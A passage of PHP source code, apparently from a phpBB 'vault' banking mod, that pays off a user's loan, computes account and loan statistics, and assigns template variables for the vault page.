	$sql = "UPDATE " . USERS_TABLE ."
		SET user_points = user_points - $pay_off
		WHERE user_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET loan_sum = 0,
		loan_time = 0
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	vault_previous( Vault_loan_pay_off_ok , vault , '' , '');
}

$sql = "SELECT * FROM ".VAULT_USERS_TABLE;
if ( !($result = $db->sql_query($sql)) ) 
{ 
	message_die(CRITICAL_ERROR, 'Error Getting Vault Users!'); 
}
$vault_stats = $db->sql_fetchrowset($result);

$opened_accounts = 0;
$total_deposit = 0;
for ( $i = 0 ; $i < count($vault_stats) ; $i++ )
{
	$opened_accounts = $opened_accounts +1;
	$total_deposit = $total_deposit + $vault_stats[$i]['account_sum'];
}

$sql = "SELECT * FROM ".VAULT_USERS_TABLE."
	WHERE owner_id = $user_id ";
if ( !($result = $db->sql_query($sql)) ) 
{ 
	message_die(CRITICAL_ERROR, 'Error Getting Vault Users!'); 
}
$vault = $db->sql_fetchrow($result);
$remaining_time = $vault_general['loan_interests_time'] - ( time() - $vault['loan_time']);
$remaining_date = $vault['loan_time'] + $vault_general['loan_interests_time'];
$loan = $vault['loan_sum'] * ( 1 + ( $vault_general['loan_interests'] / 100 ));

$template->assign_vars(array(
	'POINTS'                 => $userdata['user_points'],
	'ACCOUNTS'               => $opened_accounts,
	'TOTAL_DEPOSIT'          => $total_deposit,
	'ACCOUNT_SUM'            => $vault['account_sum'],
	'INTEREST_TIME'          => vault_make_time($vault_general['interests_time']),
	'INTEREST_RATE'          => $vault_general['interests_rate'],
	'POSTS_REQ'              => $vault_general['loan_requirements'],
	'LOAN_RATE'              => $vault_general['loan_interests'],
	'LOAN_TIME'              => vault_make_time($vault_general['loan_interests_time']),
	'LOAN_MAX_SUM'           => $vault_general['loan_max_sum'],
	'LOAN_SUM'       	       => $vault['loan_sum'],
	'LOAN_REMAINING_TIME'    => vault_make_time($remaining_time),
	'LOAN_REMAINING_DATE'    => create_date($board_config['default_dateformat'], $remaining_date, $board_config['board_timezone']), 
	'LOAN_LOAN'              => $loan,
	'DUE'                    => $due,
	'L_OTHERS'               => $lang['Vault_others'],
	'L_PREFERENCES'          => $lang['Vault_preferences'],
	'L_LIST'                 => $lang['Vault_list'],
	'L_STOCK_EXCHANGE'       => $lang['Vault_stock_exchange'],
	'L_LOAN_SUM'             => $lang['Vault_loan_sum'],
	'L_LOAN_REMAINING_TIME'  => $lang['Vault_loan_remaining_time'],
	'L_LOAN_REMAINING_DATE'  => $lang['Vault_loan_remaining_date'],
	'L_LOAN_LOAN'            => $lang['Vault_loan_loan'],
	'L_LOAN_BACK'            => $lang['Vault_loan_back'],
	'L_LOAN_ACTIVE'          => $lang['Vault_loan_active'],
	'L_LOAN_RATE'            => $lang['Vault_loan_rate'],
	'L_LOAN_TIME'            => $lang['Vault_loan_time'],
	'L_LOAN_MAX_SUM'         => $lang['Vault_loan_max_sum'],
	'L_ACCOUNT_LOAN'         => $lang['Vault_loan_make'],
	'L_LOAN'                 => $lang['Vault_loan_action'],
	'L_POSTS_REQ'            => $lang['Posts'],
	'L_NO_LOAN_EXPLAIN'      => $lang['Vault_loan_no_explain'],
	'L_INTEREST_TIME'        => $lang['Vault_interests_time'],
	'L_LOAN_INFORMATIONS'    => $lang['Vault_loan_informations'],
	'L_INTEREST_RATE'        => $lang['Vault_interests_rate'],
	'L_ACCOUNT_DEPOSIT'      => $lang['Vault_account_deposit'],
	'L_DEPOSIT'              => $lang['Vault_deposit'],
	'L_ACCOUNT_WITHDRAW'     => $lang['Vault_account_withdraw'],
	'L_WITHDRAW'             => $lang['Vault_withdraw'],
	'L_PERSONAL_INFORMATIONS'=> $lang['Vault_user_informations'],
	'L_ACCOUNT_INFORMATIONS' => $lang['Vault_account_informations'],
	'L_OPENED_ACCOUNTS'      => $lang['Vault_opened_accounts'],
	'L_TOTAL_DEPOSIT'        => $lang['Vault_accounts_sum'],
	'L_OWNER_POINTS'         => $lang['Vault_user_points'],
	'L_POINTS'               => "Yen",
	'L_PUBLIC_TITLE'         => $board_config['vault_name'],
	'L_NO_ACCOUNT'           => $lang['Vault_no_account'],
	'L_ACCOUNT'              => $lang['Vault_account'],
	'L_OPEN_ACCOUNT'         => $lang['Vault_open_account'],
	'L_CLOSE_ACCOUNT'        => $lang['Vault_close_account'],
	'L_BLACK_LISTED'         => $lang['Vault_blacklist'],
	'L_BLACK_LISTED_EXPLAIN' => $lang['Vault_blacklist_explain'],
	'L_BLACK_LISTED_DUE'     => $lang['Vault_blacklist_due'],
	'L_DUE_PAYOFF'           => $lang['Vault_blacklist_due_payoff'],
	'S_VAULT_ACTION'         => append_sid("vault.$phpEx"),
));

$template->pparse('body');
include($phpbb_root_path . 'includes/page_tail.'.$phpEx);
 
?> 
